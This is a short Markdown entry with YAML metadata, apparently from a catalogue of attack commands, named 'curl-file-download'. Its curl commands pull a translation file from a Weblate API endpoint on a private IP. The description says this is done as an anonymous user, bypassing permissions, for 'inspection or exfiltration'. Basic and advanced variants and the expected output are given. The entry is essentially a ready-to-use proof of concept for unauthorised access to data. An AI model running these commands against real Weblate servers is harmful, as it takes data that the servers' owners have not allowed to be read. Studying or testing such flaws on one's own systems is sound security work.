---
id: g7h8i9j0-k1l2-3456-ghij-789012345678
data: >-
  curl -X GET
  "http://192.168.1.129:8000/api/translations/testproject/testcomponent/en_CA/file/"
  -o translation.po
tags:
  - download
  - file-access
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:32:01.893Z'
verified: false
validated: true
submitted: true
---
# curl-file-download

## Command

```bash
curl -X GET "http://192.168.1.129:8000/api/translations/testproject/testcomponent/en_CA/file/" -o translation.po
```

## Description

This command downloads a translation file from the Weblate API endpoint as an anonymous user, bypassing permissions to save the content locally for inspection or exfiltration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | HTTP method for retrieval | Yes |
| URL | Specific file URL | Yes |
| `-o` | Output file name | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "http://192.168.1.129:8000/api/translations/testproject/testcomponent/en_CA/file/" -o translation.po
```

### Advanced Usage

```bash
curl -X GET "http://192.168.1.129:8000/api/translations/testproject/testcomponent/en_CA/file/?format=po" -o translation.po --header "Accept: text/x-po"
```

## Expected Output

The file translation.po is created with contents like msgid "Hello" msgstr "Bonjour", indicating successful download of translation strings.

## Related

- [[commands/curl-api-get]]
